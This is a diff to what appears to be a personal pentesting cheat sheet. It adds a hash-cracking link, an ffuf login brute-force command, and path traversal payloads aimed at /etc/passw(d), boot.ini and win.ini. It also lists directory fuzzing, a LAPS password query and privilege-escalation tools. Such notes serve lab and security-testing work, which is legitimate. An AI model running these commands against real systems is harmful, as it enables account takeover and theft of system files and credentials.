@@ -10,10 +10,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee           # SSTI in FLASK
 https://wiki.owasp.org/index.php/OWASP_favicon_database                           # Databse of framework by favicon  OWASP DB
 https://github.com/danielmiessler/SecLists                                        # Wordlists 
+https://crackstation.net/                                                         # Hash craking
   
 https://crt.sh                                                                    # Discover subdomains belonging to a domain by cert
 https://transparencyreport.google.com/https/certificates                          # Discover subdomains belonging to a domain by cert
-google: "-site:www.domain.com site:*.domain.com"                                  #
+google: "-site:www.domain.com site:*.domain.com"                                  # Google dorks
 
 
 ######################## Enumerate host ##############################################
@@ -31,11 +32,17 @@ ffuf -w /wordlist.txt -u http://10.10.90.15/FUZZ                                
 dirb http://10.10.90.15/ /wordlist.txt                                             # Dir fuzzing  
 gobuster dir --url http://10.10.90.15/ -w /wordlist.txt                            # Dir fuzzing
 ffuf -w /wordlist.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <site> -mr "username already exists"
+ffuf -w username.txt:W1,/wordlist.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <site> -fc 200
 
 curl <hostname> -I                                                                 # Get response header
 curl <hostname> -v                                                                 # Verbose mode with header
 curl http://site.com/images/favico.ico | md5sum                                    # Get hash of the favicon site and when chek it on the OWASP DB (see 1 note)
 
+########################### Path traversal #########################################
+
+../../../../etc/passw                                                              # Path traversal for Linux
+../../../../boot.ini                                                               # Path traversal for Win
+../../../../windows/win.ini                                                        # Path traversal for Win
 
 ######################## Enumerate privileges #######################################
 ~~~~~~~~~~~~~~~~~~~~~~~~         win          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -46,9 +53,9 @@ Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
 winpeas.exe                                                                        # check current vector of piv
 
 ########################         lin          #######################################
-sudo -l                                                                            # check aviable commands
-linpeas.sh 
-pspy64
+sudo -l                                                                            # check aviable commands & permisions
+linpeas.sh                                                                         # check aviable commands & permisions
+pspy64                                                                             # check aviable commands & permisions
 
 ########################         SSTI          #####################################
 
